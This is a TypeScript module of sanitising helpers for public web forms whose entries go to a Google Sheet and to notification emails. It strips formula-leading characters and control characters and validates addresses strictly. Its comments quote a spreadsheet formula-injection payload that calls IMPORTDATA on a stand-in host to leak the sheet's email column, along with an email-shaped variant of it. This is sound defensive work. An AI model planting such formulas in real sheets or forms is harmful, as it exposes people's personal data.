/**
 * Shared cleaning for everything the two public forms accept. Server actions run
 * on whatever the client posts, so field names, lengths and shapes are all
 * attacker-chosen until something here says otherwise.
 *
 * Not a client-side concern: the browser never renders these values back, and the
 * one place they are turned into markup, the notification email, escapes them.
 * What these guard is the two places the values travel to as data rather than
 * text: a Google Sheet, which reads a leading "=" as a formula, and an email
 * header, which reads a newline as the end of the header.
 */

/** Long enough for a real answer, short enough that a single post cannot be a payload. */
export const LIMITS = {
  name: 120,
  email: 254, // the maximum length of an address, RFC 5321
  organisation: 160,
  source: 40,
  message: 5000,
} as const;

/**
 * Sheets treats a cell beginning with any of these as a formula. IMPORTDATA and
 * IMPORTXML fetch a URL the moment the sheet is opened and need no confirmation,
 * so a name of =IMPORTDATA("https://example.test/?x="&C2) would hand the whole
 * email column to whoever owns that host. Writing values as RAW stops Sheets
 * parsing them at all, and stripping the lead character as well keeps the text
 * safe if the tracker is ever exported to CSV and opened in Excel, which parses
 * formulas on its own terms.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]+/;

/** Everything C0 and C1 except the newline, plus the Unicode line separators. */
const CONTROL_CHARS = new RegExp("[\\u0000-\\u0008\\u000B-\\u001F\\u007F-\\u009F\\u2028\\u2029]", "g");

function read(formData: FormData, field: string): string {
  const value = formData.get(field);
  return typeof value === "string" ? value : "";
}

/** No control characters, no line breaks, collapsed whitespace, capped. */
function flatten(value: string, max: number): string {
  return value
    .replace(CONTROL_CHARS, "")
    .replace(/[\r\n]+/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, max);
}

/** One line, additionally stripped of anything Sheets would read as a formula. */
export function singleLine(formData: FormData, field: string, max: number): string {
  return flatten(read(formData, field), max).replace(FORMULA_LEAD, "").trim();
}

/** Free text: newlines survive, runs of them do not, and control characters go. */
export function multiLine(formData: FormData, field: string, max: number): string {
  return read(formData, field)
    .replace(CONTROL_CHARS, "")
    .replace(/\n{3,}/g, "\n\n")
    .trim()
    .slice(0, max);
}

/**
 * Deliberately stricter than the usual one-liner. The regex this replaces,
 * /^[^\s@]+@[^\s@]+\.[^\s@]+$/, accepts =IMPORTDATA("https://example.test/x")@a.bc
 * because that string has neither a space nor a second "@": every character the
 * attack needs is legal in its local part.
 */
const EMAIL = /^[A-Za-z0-9](?:[A-Za-z0-9._%+-]*[A-Za-z0-9])?@[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]*[A-Za-z0-9])?)+$/;

/**
 * Note that this does NOT strip the formula lead first. It used to, and stripping
 * turned "@a@b.co", which is not an address, into "a@b.co", which is someone's.
 * Rewriting an invalid address into a valid one is worse than rejecting it, and
 * the regex below already refuses anything not starting with a letter or digit,
 * so a formula can never reach the test as a candidate address anyway.
 */
export function cleanEmail(formData: FormData, field = "email"): string | null {
  const value = flatten(read(formData, field), LIMITS.email).toLowerCase();
  return EMAIL.test(value) ? value : null;
}

/**
 * Which surface a signup came from. Ours, not the visitor's, but it arrives in a
 * hidden field, so it is reduced to a slug rather than trusted. Reducing beats an
 * allow-list here: a trigger added later keeps working instead of silently
 * recording itself as something else.
 */
export function cleanSource(formData: FormData): string {
  const slug = read(formData, "source")
    .toLowerCase()
    .replace(/[^a-z0-9-]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, LIMITS.source);
  return slug || "site";
}
